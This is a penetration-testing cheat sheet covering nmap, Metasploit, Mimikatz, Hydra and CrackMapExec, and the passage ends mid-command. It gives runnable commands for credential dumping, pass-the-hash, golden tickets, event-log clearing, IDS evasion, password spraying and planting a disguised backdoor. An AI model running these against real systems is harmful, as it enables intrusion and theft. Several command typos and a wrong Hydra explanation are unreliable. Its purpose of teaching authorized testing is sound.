
>This note is intended strictly for educational and ethical use only. Any misuse or unauthorized activity is strongly discouraged and not supported.

<!--
>I share this note to help others learn about cybersecurity in a responsible way. Please use them ethically and only on systems you’re authorized to test.
-->

## Enumeration

### enum4linux

Example target: `192.168.1.10`

```sh
enum4linux -a 192.168.1.10
```

| Option | Description                                         |
| ------ | --------------------------------------------------- |
| `-a`   | Do **all** available checks (recommended for recon) |
| `-U`   | Enumerate **users**                                 |
| `-S`   | Enumerate **shares**                                |
| `-G`   | Enumerate **groups**                                |
| `-P`   | Enumerate **password policy**                       |
| `-r`   | Enumerate **RID cycling** for users/groups          |
| `-o`   | Enumerate **OS information**                        |
| `-h`   | Show **help**                                       |


### Nmap

Example target: `192.168.1.10`

#### Basic commands

Scan a single IP:
```sh
nmap 192.168.1.10
```

Scan multiple IP addresses:
```sh
nmap 192.168.1.10 192.168.1.11
```

Scan a domain:
```sh
nmap scanme.nmap.org
```

Note: [scanme.nmap.org](http://scanme.nmap.org) is a machine set up to help people learn about Nmap and test Nmap installation.

Scan a range:
```sh
nmap 192.168.1.10-254
```

Scan multiple ranges:
```sh
nmap 192.168.1.1-255 192.168.2.1-255
```

>"Why up to .255? Aren’t the hosts only up to .254?"
In a typical /24 subnet (like 192.168.1.0/24),
- `192.168.1.0` is the network address
- `192.168.1.255` is the broadcast address
Valid host addresses are `192.168.1.1` through `192.168.1.254`
So yes, the actual usable hosts end at `.254`, not `.255`.

However, when you give nmap a range like:
```sh
nmap 192.168.1.1-255
```
nmap will attempt to scan all those addresses, including `.255`.
It’s not wrong syntactically; it just means you’re also probing the broadcast address, which typically won’t respond (and in some networks could cause extra noise).

With that being said, the best pratice is to use `.1-254` or the CIDR notation such as following which is cleaner and ensures nmap knows it’s a standard /24 subnet.

Scan using a CIDR (Classes Inter-Domain Routing) notation:
```sh
nmap 192.168.1.0/24
```

Note: [What is CIDR? - GeeksforGeeks](https://www.geeksforgeeks.org/computer-networks/classless-inter-domain-routing-cidr/)


Scan using a few parameters:
```sh
nmap -sV -sC -sT -p- 192.168.1.10
```

| Option            | Description                                        |
| ----------------- | -------------------------------------------------- |
| `-sS`             | **SYN scan** (stealthy and fast)                   |
| `-sT`             | **TCP connect** scan (less stealthy)               |
| `-sU`             | **UDP scan**                                       |
| `-sV`             | **Service version detection**                      |
| `-sC`             | Run Nmap scripts (particularly to reveal types of the software, like Vsftpd which is a type of FTP)                      |
| `-O`              | **OS detection**                                   |
| `-A`              | Aggressive scan: OS, services, traceroute, scripts |
| `-p`              | Specify port(s) (e.g., `-p 22`, `-p 1-1000`)       |
| `-p-`             | Scan all ports                                     |
| `-Pn`             | Skip host discovery (use if ICMP is blocked)       |
| `-T4`             | Set timing template for faster scanning            |
| `-oN` / `-oX`     | Output results to file (normal/XML)                |
| `--script=<name>` | Run specific NSE script(s)                         |

Note: `-sT` is similar with SYN scans but sends more packets. It is loud in network and easily detectable. However, this is used by default even if you don't specify it.

##### Scan multiple targets from a file

```sh
nmap -iL targets.txt
```

###### Possible content of tagrts.txt
```sh
# Production webservers
web1.company.local
web2.company.local

# Internal subnets
192.168.10.0/24

# Specific hosts
192.168.1.15
192.168.1.20-25

# IPv6 test host
2001:db8::5
```

##### Fast and Verbose scan

Background question: What do you think if you do the following?
```sh
nmap 192.168.1.10
```
Nmap scans 1000 most commonly used ports.

If you want to do the scan faster, you can use the `-F` parameter in order to only scan 100 most commonly used ports:
```sh
nmap -F 192.168.1.10
```

If you want to see what's going on in the scan process, you can use `-v` to verbose it:
```sh
nmap -F 192.168.1.10 -v
```

for greater verbosity:
```sh
nmap -F 192.168.1.10 -vv
```


##### Scan a particular port

```sh
nmap -p 80 192.168.1.10
```

Want to skip ping to avoid 'Host seems down'? Use this:

```sh
nmap -Pn -p 80 192.168.1.10
```

##### Scan several ports

```sh
nmap -Pn -p 21,22,25,80,445,3389,8080 192.168.1.10
```

Note: If you see 'filtered' in the 'STATE' column of an nmap scan result, there is a good chance that a firewall exists in the system (target).

Also, this is how to see if a firewall is within the system you're in (localhost = 127.0.0.1):
```sh
nmap -Pn -p 21,22,25,80,445,3389,8080 127.0.0.1
```

Scan some ports using a range:
```sh
nmap -p 21-1000 192.168.1.10
```

Scan multiple TCP and UDP ports:
```sh
nmap -p U:53,T:21-25,80,443,8080 192.168.1.10
```

Scan ports from their service names:
```sh
nmap -p http,https 192.168.1.10
```

##### Scan all ports

```sh
nmap -p- 192.168.1.10
```

To avoid 'Host seems down':
```sh
nmap -Pn -p- 192.168.1.10
```

In order to increase the speed of the scan (More vulnerable to IDS though):
```sh
nmap -Pn -T4 -p- 192.168.1.10
```

Rule of thumb: 
```
NEVER assume that every system is configured the same, be it Windows, Linux, or other systems. You may end up finding services running on other ports (which is actually common in real world).
```

##### Skip ping

Note: important, especially if a "normal" scan (without params) says "Host seems down"

```sh
nmap -Pn 192.168.1.10
```

##### UDP Scan

Note: Nmap does TCP scan by default

```sh
nmap -sU 192.168.1.10
```

##### Service and OS Detection Scan

```sh
### Service scan
nmap -sV 192.168.1.10
```

```sh
### Service and OS detection scan
nmap -sV -O 192.168.1.10
```

##### Default Scripts Scan

```sh
nmap -sC 192.168.1.10
```

##### Output to a file

Save the terminal output

```sh
nmap 192.168.1.10 -oN nmap_scan
```

Save the output into an XML format (can be imported to Metasploit)

```sh
nmap -oX nmap_scan 192.168.1.10
```

Save thr output into: Normal (.nmap), XML (.xml), and Grepable (.gnmap) formats

```sh
nmap -oA nmap_scan 192.168.1.10
```

Append output to a previous scan file:
```sh
nmap 192.168.1.10 -oN nmap_scan --append-output
```

##### Aggressive scan

Note: `-A` = `-sV` + `-O` + `-sC`

```sh
nmap -A 192.168.1.10
```

##### 'Skip ping' scan

Background: there are some cases in which if you perform 
```sh
nmap 192.168.1.10
```
Nmap will reply with 'Host seems down' and not even continue to port scanning. This is because Nmap carries out host discovery, then do port scanning.

In order to avoid such cases, you can do a "don't ping" scan:

```sh
nmap -Pn 192.168.1.10 
```


##### TCP-SYN ping scans: One of the most accurate way to tell if a host is up (host discovery)

Port 3389 as an example:

```sh
nmap -sn -PS3389 192.168.1.10
```

Several ports as an example:

```sh
nmap -sn -PS80,3389,445 192.168.1.10
```

A range of ports as an example:

```sh
nmap -sn -PS1-1000 192.168.1.10
```

Important note: When doing host discovery, `nmap -PS80,3390,445 192.168.1.10` takes longer than `nmap -sn -PS80,3389,445` because `-sn` skips port scanning and does ping scans.


##### TCP-ACK pings: not recommended for host discovery

Note: Not recommended for host discovery because certain systems might be configured to block packets with ACK flags set. (But might be useful for firewall discovery?)

Sending packets without SYN:

```sh
nmap -sn -PA 192.168.1.10
```

##### ICMP ping scans

Host discovery ICMP echo requests:
```sh
nmap -sn -PE 192.168.1.10 --send-ip
```

##### Firewall & IDS Evasion

(1) Using fragmented packets

The idea is to send packets in smaller packets so IDS can not analyze them, whether those are packets to be flagged or not.

Note: `-f` to send fragmented packets

```sh
nmap -Pn -sS -sV -p- -f 192.168.1.10
```

```sh
nmap -sV -O -sC -f --data-length 200 192.168.1.10
```

Note: `--mtu` means maximum transmitted units. The size of mtu is > 0 and a multiple of 8.


```sh
nmap -sV -O -sC -f --mtu 8 192.168.1.10
```

(2) Using decoy IP addresses

```sh
nmap -D 192.168.1.63,192.168.1.65 192.168.1.10
```

```sh
nmap -Pn -sS -sV -sV -p- -f --data-length 200 -D 192.168.1.63,192.168.1.65 192.168.1.10
```

Note:
- Decoy IPs are `192.168.1.63` and `192.168.1.65`
- The target IP is `192.168.1.10`


(3) Append random data to sent packets

```sh
nmap --data-length 200 192.168.1.10
```


(4) Set your own offset size

```sh
nmap 192.168.1.10 --mtu 32
```


(5) Relay connections through HTTP/SOCK4 proxies

```sh
nmap --proxies http://192.168.1.13:8000,http://192.168.1.17:8080 192.168.1.10
```

###### Example of Firewall/IDS Evasion command

```sh
nmap -f -t 0 -n -Pn --data-length 200 -D 192.168.1.15,192.168.1.21,192.168.1.23,192.168.1.27 192.168.1.10
```


##### My go-to

```sh
nmap -Pn -sS -sV -O -sC -p- 192.168.1.10 -v
```

or

```sh
nmap -Pn -sS -A -p- 192.168.1.10 -v
```

often used in exams:
```sh
nmap -Pn -sS -sV -O -sC -p- 192.168.1.10 -oA scan_result
```

Note: 
- Another case: Ping scans for a general sweep of the network -> TCP-SYN ping scans (for systems that might block ping scans)

Other good examples (these are for host discovery):

```sh
nmap -sn -T4 192.168.1.10 -v
```

```sh
nmap -sn -PS21,22,25,80,445,3389,8080 -T4 192.168.1.10 -v
```

In the event of Windows, combine with UDP scanning using `-PU`:
(because some firewalls might be configured only for TCP, not for UDP...)

```sh
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 192.168.1.10 -v
```

Scanning an entire network? Just specify the subnet:
(This takes longer because it scans a bunch of IPs)

```sh
nmap -sn -PS21,22,25,80,445,3389,8080 -PU137,138 -T4 192.168.1.0/24 -v
```

Note: in order to specify the subnet, run `ifconfig` or `ip a s`.

##### Enable ipv6 scanning 

```sh
nmap -6 2207:d9e1:1003:33::5
```

##### Show the details of packets captured during a scan

```sh
nmap 192.168.1.1 --packet-trace
```

##### Traceroute to random targets without a port scan

```sh
nmap -iR 10 -sn -traceroute
```

##### Debug mode

```sh
nmap 192.168.1.10 -d
```

Increase debugging level:
```sh
nmap 192.168.1.10 -dd
```

##### Display a reason why a port is in a particular state

```sh
nmap 192.168.1.10 -reason
```
Probably will yield in the same output as `-vv`


References:
- eJPT training - INESecurity
- [Nmap - StationX](https://www.stationx.net/nmap-cheat-sheet/)


### Metasploit

Start PostgreSQL:
```sh
sudo service postgresql start
```

Check PostgreSQL setatus:
```sh
service postgresql status
```

Start msfconsole:
```sh
msfconsole
```

Check database connection in msfonsole:
```sh
db_status
```


#### Metasploit modules

Metasploit modules are primarily stored in `/usr/share/metasploit-framework/modules`:

```sh
ls /usr/share/metasploit-framework/modules 
```

The output of the command above:
```sh
auxiliary  encoders  evasion  exploits  nops  payloads  post  README.md
```

According to [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/modules-and-locations/):
1. `auxilary`: module that includes port scanners, fuzzers, sniffers
2. `exploits`: module that uses payloads
3. `payloads`: module that consists of code that runs remotely
4. `encoders`: module that ensures that payloads make it to their destination intact
5. `nops`: module that keep the payload sizes consistent across exploit attempts


#### Search for modules

The following is some examples of search to find specific modules:

1. Searching fot `auxiliary` modules related to `smb`:

```sh
search type:auxiliary name:smb
```

2. Searching for exploits related to CVEs found in 2009:
```sh
search cve:2009 type:exploit
```

Want to see the ones specific to Linux?
```sh
search cve:2009 type:exploit platform:-linux
```

3. Searching for modules (not just exploits) related to CVEs found in 2009, sorted by their names
```sh
search cve:2009 -s name
```


#### Create a workspace in Metasploit

By default, the workspace is `default`. It is recommended to create a workspace per project.

Create a workspace:
```sh
workspace -a smb_enum
```
msfconsole will switch to the created workspace immediately.

#### Import an Nmap scan into Metasploit

Let's say you saved Nmap output with a command such as `nmap <target> -oA scanresult`. 

One of the output is an XML file which can be imported into Metasploit:
```sh
db_import scanresult.xml
```

Note: You can also import other files such as Nessus scan reports.
For more details, check:
```sh
db_import
```

Next, you can check:
```sh
hosts
```

See services in the scan output:
```sh
services
```

#### Running Nmap in Metasploit

```sh
db_nmap 192.168.1.10
```

One can also use a variety of options when running Nmap in Metasploit:
```sh
db_nmap -Pn -sV -sO -sC -p- 192.168.1.10
```

#### Metasploit plugins

See available Metasploit plugins:
```sh
load -l
```

Metasploit plugins are available in `/usr/share/metasploit-framework/plugins`:
```sh
ls /usr/share/metasploit-framework/plugins
```


##### Adding a Metasploit plugin

Let's add the [`metasploit-autopwn`](https://github.com/hahwul/metasploit-autopwn) plugin!

1. Clone the repository

```sh
git clone https://github.com/hahwul/metasploit-autopwn
```

2. Copy `db_autopwn.rb` into the Metasploit plugins directory

```sh
cp db_auopwn.rb /usr/share/metasploit-framework/plugins/
```

If it does not work, try:
```sh
sudo cp db_autopwn.rb /usr/share/metasploit/framework/plugins/
```

3. Start Metasploit and load the plugin

```sh
msfconsole
```

```sh
msf6 > load db_autopwn 
```

```sh
msf6 > db_autopwn -h
```

##### Kiwi - A Metasploit plugin

Kiwi is an extension/a plugin that grabs credentials from Windows memory.

In order to use Kiwi, one should load it in msfconsole:
```sh
load kiwi
```

There are some methods in Kiwi to dump credentials, some of them are:

```sh
creds_all
```

```sh
creds_kerberos
```

Reference: [Methods in Kiwi](https://docs.metasploit.com/api/Rex/Post/Meterpreter/Extensions/Kiwi/Kiwi.html#creds_all-instance_method)


If you want to run Kiwi on a Windows machine (typically after getting access to one), you can upload the executable via *meterpreter* :

```sh
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Or if the target machine has a 32-bit architecture:
```sh
upload /usr/share/windows-resources/mimikatz/x86/mimikatz.exe
```

##### Kiwi - in Windows

###### Mimikatz - Powershell
```sh
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

###### Mimikatz console
```
mimikatz # privilege::debug
```

List all available provider credentials (more often than not, this shows recently logged on user and computer credentials)
```
mimikatz # sekurlsa::logonpasswords
```

Clear an event log:
```
mimikatz # event::clear
```

Patch Events service to avoid new events:
```
mimikatz # event::drop
```

Note: run this in order `privilege::debug` -> `event::drop` -> `event::clear`


Request TGS tickets:
```
mimikatz # kerberos::ask
```

List tickets in MIT/Heimdall cache:
```
kerberos::clist
```

List all user tickets in user memory:
```
kerberos::list
```

Purge all Kerberos tickets:
```
kerberos::purge
```

Get current TGT for current user:
```
kerberos::tgt
```

```
lsadump::backupkeys
```

Ask LSA server to pull credentials from SAM/active directory:
```
lsadump::lsa
```

Get preferred backup master keys:
```
sekurlsa::backupkeys
```

List credential manager:
```
sekurlsa::credman
```

List cached masterkeys:
```
sekurlsa::dpapi
```

List DPAPI_SYSTEM secret:
```
sekurlsa::dpapiSystem
```

DPAPI = Data Protection API

It's a Windows feature that encrypts secrets such as:
- Browser passwords
- Wi-Fi passwords
- Credential Manager entries
- Private keys
- RDP saved credentials
- Some application secrets


List Kerberos encryption keys:
```
sekurlsa::ekeys
```

List Kerberos credentials for all authenticated users (including services and computer accounts):
```
sekurlsa::kerberos
```

Get domain kerberos service account (KRBTGT) password data:
```
sekurlsa::krbtgt
```

List LiveSSP credentials:
```
sekurlsa::liveSSP
```

[One of the most powerful commands in Mimikatz]
List all available provider credentials (usually shows recently logged on users and computer credentials):
```
sekulrsa::logonpasswords
```

Pass- theHash and Over-Pass-the-Hash:
```
sekurlsa::pth
```

(Need to verify this) Switch to LSASS minidump process context:
```
sekurlsa::minidump c:\tmp\lsass.dmp
```

List LM and NTLM credentials:
```
sekurlsa::msv
```

Switches to LSASS process context:
```
sekurlsa::process
```

Lists WDigest credentials:
```
sekurlsa::wdigest
```

Note: WDigest = an authentication method that historically exposed cleartext passwords in memory.


Lists/exports certificates:
```
crypto::certificates
```

Creates golden/silver/trust tickets:
```
kerberos::golden
```

Passes the ticket (commonly used to inject a stolen Kerberos ticket):
```
kerberos:ptt
```

Mimikatz reference: 
- [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
- [Mimikatz cheatsheet](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4)


#### Putting Metasploit in background

(1)
- Press `Ctrl + z`, then you'll see normal terminal.
- Run `fg` in terminal to return to the existing process/session

(2)
- In meterpreter session, type `bg` then type `y` to confirm putting the session in the background.
- Run `sessions` in Metasploit to list existing sessions.
- Type `sessions -i <session ID>` to enter session, such as `sessions -i 1` to enter session 1.


#### Pivoting in Metasploit

(To-do: complete this)

According to [Rapid7 - Metasploit Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html), there's a couple of ways to register routes:

1. `AutoRoute` (automated)
2. `Route` (more of a manual method)

For instance, we have 3 machines:

1. Kali Machine
Internal: None
External: ???
2. Target 1 (used as pivot)
Internal: 10.2.27.1
External: ???
3. Target 2 (final target)
Internal: 10.2.27.187
External: None

##### `AutoRoute`:

1. Scan the target machine
Start by scanning the reachable target machine to identify any vulnerable services. In this case, we're looking for the HTTPFileServer service.

2. Find an exploit for the vulnerable service
Search for an exploit for the identified service. You can use tools like searchsploit or search directly within Metasploit’s msfconsole by typing `search <service_name>`.

3. Run the exploit
Most exploits are available in Metasploit. Load the exploit, configure it, and run it to gain access to the first target machine (let's call it Target 1).

4. Check network connections on Target 1
Once you have access, run ifconfig on Target 1 to display its network interfaces. Look for the interface that shares the same subnet as the second target (Target 2), which is your real goal.

5. Set up a route to Target 2
Use the autoroute module to add a route to Target 2’s network.

Command: `run autoroute -s <Network Address>/<Subnet Mask>`

Example: `run autoroute -s 10.2.27.0/20`

6. Scan for open ports on Target 2
Put the current session in the background with bg. Then, search for the portscan module in Metasploit using search portscan. Run the TCP portscan module to identify open ports on Target 2.

7. Return to the session
Go back to the session for Target 1 by typing `sessions -i 1`.

8. Set up port forwarding
Configure port forwarding to route traffic from your machine to Target 2 through Target 1.

Command: `portfwd -l <attacker’s port> -p <Target 2’s open port> -r <Target 2’s IP>`

Example: `portfwd -l 1234 -p 80 -r 10.2.27.187`

9. Background the session again
Put the Target 1 session back in the background with `bg`.

10. Run Nmap within Metasploit
Use Metasploit’s db_nmap to scan Target 2 through the forwarded port.

Command: `db_nmap -sS -sV -p <attacker’s port> localhost`

Example: `db_nmap -sS -sV -p 1234 localhost`

11. Identify vulnerable services on Target 2
From the scan results, look for any vulnerable services. In this case, let’s say it’s the BadBlue service.

12. Search for exploits for the vulnerable service
Look for exploits for the identified service (e.g., BadBlue). Use searchsploit or Metasploit’s search command.

**Tip**: Check the service’s version to ensure the exploit matches.

13. Configure and run the exploit
Load the exploit in Metasploit, configure its options, and run it. Pay attention to:
- RHOSTS: Set this to Target 2’s IP address.
- LPORT: Change the default (e.g., `4444`) to something like `4433`.
- RPORT: Ensure this matches the open port on Target 2 (e.g., 80 for BadBlue).

14. Gain access to Target 2
If the exploit works, you should now have access to Target 2!

15. Rename the session
For clarity, rename the session to something meaningful, like `session -n target2`.

#### Clearing logs in Meterpreter

This will clear the Application, System, and Security logs on a Windows system:
```sh
meterpreter > clearev
```


### SSH

```sh
ssh root@192.168.10
```

If there's a private key:
```sh
ssh -i id_rsa root@192.168.1.10
```


### FTP

```sh
ftp 192.168.1.10
```


### SMBclient

```sh
smbclient -L //192.168.1.10 -N
```

| Option       | Description                 |
| ------------ | --------------------------- |
| `-L //<IP>`  | List available shares       |
| `-U <user>`  | Username                    |
| `-N`         | No password (guest access)  |
| `//<IP>/share` | Connect to a specific share |


### LinEnum

```sh
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

| **Option** | **Description**                                                                  | **Example Command**                   |
| ---------- | -------------------------------------------------------------------------------- | ------------------------------------- |
| `-k`   | Enter **keyword** to search for during enumeration (e.g., "sudo", "password").   | `./LinEnum.sh -k "sudo"`              |
| `-e`   | Enter **export location** to save the output report.                             | `./LinEnum.sh -e /path/to/output/dir` |
| `-t`   | Include **thorough (lengthy) tests** to provide more detailed results.           | `./LinEnum.sh -t`                     |
| `-s`   | Supply **current user password** to check sudo permissions (INSECURE).           | `./LinEnum.sh -s password123`         |
| `-r`   | Enter **report name** to save the output as a specific file name (e.g., `.txt`). | `./LinEnum.sh -r linenum_report`      |
| `-h`   | Display this help text with all available options.                           | `./LinEnum.sh -h`                     |


### LDAPsearch

```sh
ldapsearch -x -h <IP> -s base
```

| Option | Description                            |
| ------ | -------------------------------------- |
| `-x`   | Simple authentication                  |
| `-h`   | LDAP server IP                         |
| `-b`   | Base DN (e.g., `dc=example,dc=com`)    |
| `-s`   | Search scope (`base`, `one`, or `sub`) |


### RPCclient

```sh
rpcclient -U "" <target>
```

| Option  | Description                   |
| ------- | ----------------------------- |
| `-U ""` | Anonymous login               |
| `-c`    | Run commands inside the shell |

Useful commands:

```sh
rpcclient $> enumdomusers
```

```sh
rpcclient $> queryuser <RID>
```

```sh
rpcclient $> netshareenum
```


### NMB Lookup

```sh
nmblookup -A 192.168.1.10
```

| Option  | Description                   |
| ------- | ----------------------------- |
| `-A <IP Address>` | lookup by IP to connect to a server’s NetBIOS info and list server connection information              |


### Hydra

```sh
hydra <flags> <IP_Address> <protocol>
```

| Option  | Description                   |
| ------- | ----------------------------- |
| `-l <username>` | login name |
| `-P <path/to/file>` | path to password wordlist |
| `-L <path/to/file>` | login username wordlist |

In other words (and for example):
```sh
# hydra -l <username> -p <password> <target> <service>
hydra -l admin -p pass123 192.168.1.10 smb
```
or
```sh
# hydra -l <username> -p <password> <service>://<target>
hydra -l admin -p pass123 smb://192.168.1.10
```


The following will try to login to the SMB server at the IP address with the username admin trying passwords found in the rockyou txt file:
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb
```

If you want to verbose the output, you can include `-V`:
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -V
```

If you want to run it in debug mode, use the `-d` flag:
```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -d
```

If you want Hydra to stop as soon as it discovers the first valid username and password combination, you can use `-F` option:
```sh
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -F
```

To check for three trivial passwords, you can use the `-e nsr` option:
```sh
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.10 smb -e nsr 
```
note:
- `n` tells Hydra to test for accounts with no password
- `s` tests if users reused their own username as the password.
- `r` attempts to log in with the username flipped backwards.


If your Hydra session stops unexpectedly, you can restart it with the `-R` option (thanks to Hydra’s built-in resume capability):
```sh
hydra -R
```
(Valid only when one or more prior Hydra commands were interrupted before completing though)

Generating passwords of a certain format on the fly:
```sh
# hydra [-l <username> or -L <usernames list>] [-p <password> or -P <password list>] -x <min>:<max>:<charset> <target> <service>
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -x 8:12:a1#$ 192.168.1.10 smb
```

For instance:
```sh
8:12:a1#$
```
means:
- Generate passwords that are between 5 and 7 characters long
- Use lowercase letters (a–z)
- Include numbers (0–9)
- Allow any number of # and $ characters (meaning these symbols can appear multiple times or not at all in the generated passwords)


If you want to save the output to a file:
```sh
# hydra -L <username list file> -P <password list file> <target> <service> -o <output filename>
hydra -L usernames.txt -P /usr/share/rockyou.txt 192.168.1.10 smb -o hydra_smb_output
```

FTP:
```sh
hydra -t 4 -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -v 192.168.1.10 ftp
```

or if you target a domain:
```sh
hydra -t 4 -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt -v demo.exampledomain.net ftp
```


SSH:
```sh
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.10 ssh
```


If you already know some username and password combinations on your server, you can list them in a separate text file—one per line in the format `username:password`. Then, you can use `-C` (combo entries):
```sh
# hydra -C <username and password pairing file> <target> <service>
hydra -C userpass.txt 192.168.1.10 smb
```

If you have multiple targets at once, store their IP addresses in a file and apply the -M option:
```sh
# hydra -l <admin> -p <password> -M <IP addresses of targets> <service>
hydra -l admin -p pass123 -M targetIPs.txt smb
```

Note: you can replace [`-l admin -p pass123`] above with several options, such as:
```sh
hydra -l admin -P /usr/share/rockyou.txt -M targetIPs.txt smb
```
and
```sh
hydra -L usernames.txt -P /usr/share/rockyou.txt -M targetIPs.txt smb
```

If you know a service is not running on a non-default port (e.g.: rdp running on port 3333 instead of port 3389), you can use options `-s`:
```sh
# hydra -L <username list file> -P <password list file> <target> -s <non-default port of the target service> <service>
hydra -L usernames.txt -P /usr/share/rockyou.txt 192.168.1.10 -s 3333 rdp
```

Hydra operates on the CPU and supports multithreading, allowing it to test several login attempts at once. You can use the `-t` option to increase the speed of your password cracking (By default, Hydra uses **16 threads**) :
```sh
# hydra -L <username list file> -P <password list file> <target> -t <number of threads> <service>
hydra -L usernames.txt -P /usr/share/rockyou.txt 192.168.1.10 -t 4 smb
```

To find out which parameters apply to a service Hydra supports, run this command:
```sh
# hydra <service> -U
hydra smb -U
```

Performing a bruteforce attack on a web login:
Format:
```sh
# hydra [-l <username> or -L <username list>] [-p <password> or -P <password list>] <website URL> http-post-form "path/to/web/login/index.php:userField=^USER^:passField=^PASS^"
```

Example:
```sh
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/rockyou.txt 127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passField=^PASS^"
```
Note: you don't need to replace this `userField=^USER^:passField=^PASS^` in the command above.

That extra argument at the end is just the part of the URL after the server name/IP. For how to make it, try the command below:
```sh
hydra http-post-form -U
```

Reference: [Hydra - Stationx](https://www.stationx.net/how-to-use-hydra/)


### Crackmapexec

Crackmapexec is a useful tool in Windows active directory environment that automates activities such as advanced password attacks and post-exploitation attacks
(Reference: [stationx](https://www.stationx.net/crackmapexec-cheat-sheet/))

Examples:
```sh
# crackmapexec <service> <target>
crackmapexec smb 192.168.1.10
```

[Needs Verification] Try a combination of a username and a password (no bruteforce):
```sh
# crackmapexec <service> -u <username> -p <password> --no-bruteforce <target>
crackmapexec smb -u admin -p pass123 --no-bruteforce 192.168.1.10
```

#### Crackmapexec - SMB

```sh
# crackmapexec <service> <target> -u <USERNAME> -p <PASSWORD> --users
crackmapexec smb 192.168.1.10 -u admin -p pass123 --users 
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --groups
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --shares
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --computers
```

```sh
crackmapexec smb 192.168.1.10 -u admin -p pass123 --sessions
```

#### Crackmapexec - Password Spraying attack

```sh
# crackmapexec <service> -u <username> -p <password> <target>
crackmapexec smb -u admin -p /usr/share/wordlists/rockyou.txt 192.168.1.10
crackmapexec winrm -u admin -p /usr/share/wordlists/rockyou.txt 192.168.1.10
```

#### Crackmapexec - Credential Harvesting

- Identifies the port that the service is running on (if it's not running on its standard port)
```sh
# crackmapexec <service> -u <username> -p <password> --port <port> <target>
crackmapexec smb -u admin -p pass123 --port 445 192.168.1.10
```

- Grab SAM hashes from the target system after successful login
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> --sam <target>
crackmapexec smb  -u admin -p pass123 --sam 192.168.1.10
```

- Dump LSA secrets from the target system after successful login
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> --lsa <target>
crackmapexec smb -u admin -p pass123 --lsa 192.168.1.10
```

- Find local administrator accounts across machines
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> -x 'net localgroup administrators' <target>
crackmapexec smb -u admin -p pass123 -x 'net localgroup administrators' 192.168.1.10
```

- [Needs verification] Get NTDS.dit from the target domain controller (uses drsupai by default)
```sh
# crackmapexec smb -u <username> -p <password> --ntds [vss,drsupai] <target>
crackmapexec smb -u admin -p pass123 --ntds drsupai 192.168.1.10
```


#### Crackmapexec - Gaining Access and Lateral Movement

- Execute a command on the target machine
```sh
# crackmapexec <smb or winrm> -u <username> -p <password> -x <command> <target>
crackmapexec smb -u admin -p pass123 -x ipconfig 192.168.1.10
```

- [Kerberoasting] Get a Ticket Granting System (TGS) ticket which can be cracked using Hashcat
```sh
# crackmapexec ldap -u <username> -p <password> --kerberoasting <target>
crackmapexec ldap -u admin -p pass123 --kerberoasting 192.168.1.10
```

- [AS REP roasting] Get AS REP response ready to crack with Hashcat to carry out ASREP-roasting
```sh
# crackmapexec ldap -u <username> -p <password> --asreproast <target>
crackmapexec ldap -u admin -p pass123 --asreproast 192.168.1.10
```

#### Crackmapexec - Post-Exploitation

- Enable RDP on a target machine after a successful login attempt
```sh
# crackmapexec smb -u <username> -p <password> -M rdp
crackmapexec smb -u admin -p pass123 -M rdp
```

- List tokens the attacker can impersonate on the target machine, in order to escalate their privileges
```sh
# crackmapexec smb -u <username> -p <password> -M impersonate
crackmapexec smb -u admin -p pass123 -M impersonate
```

- Search for files with `AlwaysInstallElevated` attribute that can be used to escalate one's privileges
```sh
# crackmapexec smb -u <username> -p <password> -M install_elevated
crackmapexec smb -u admin -p pass123 -M install_elevated
```

- Gather all antivirus installed on a target machine
```sh
# crackmapexec smb -u <username> -p <password> -M enum-avproducts
crackmapexec smb -u admin -p pass123 -M enum-avproducts
```

- Dump DNS from the active directory DNS server using WMI
```sh
# crackmapexec smb -u <username> -p <password> -M enum_dns
crackmapexec smb -u admin -p pass123 -M enum_dns
```

- Get a target machine's current network connections using WMI
```sh
# crackmapexec smb -u <username> -p <password> -M get_netconnections
crackmapexec smb -u admin -p pass123 -M get_netconnections
```

- Check for KeePass-related files that potentially contain credentials
```sh
# crackmapexec smb -u <username> -p <password> -M keepass_discover
crackmapexec smb -u admin -p pass123 -M keepass_discover
```

- Upload a local file onto a target machine
```sh
# crackmapexec smb -u <username> -p <password> --put-file <file in local machine> <path in target machine>
crackmapexec smb -u admin -p pass123 --put-file msfvenom_backdoor.exe C:\Windows\Temp\backup.exe
```

- Get a file from a target machine
```sh
# crackmapexec smb -u <username> -p <password> --get-file <file in remote machine> <path in local machine>
crackmapexec smb -u admin -p pass123 --get-file C:\Windows\User\Desktop\credentials.txt creds.txt 
```

- Get information about Active Directory environment
```sh
# crackmapexec ldap -u <username> -p <password> -M get-network
crackmapexec ldap -u admin -p pass123 -M get-network
```

- Grab Windows Local Administrator Password Solution (LAPS) passwords
```sh
# crackmapexec ldap -u <username> -p <password> -M laps
crackmapexec ldap -u admin -p pass123 -M laps
```

- Automatically enumerate and exploit MS SQL privileges
```sh
# crackmapexec mssql -u <username> -p <password> -M mssql_priv
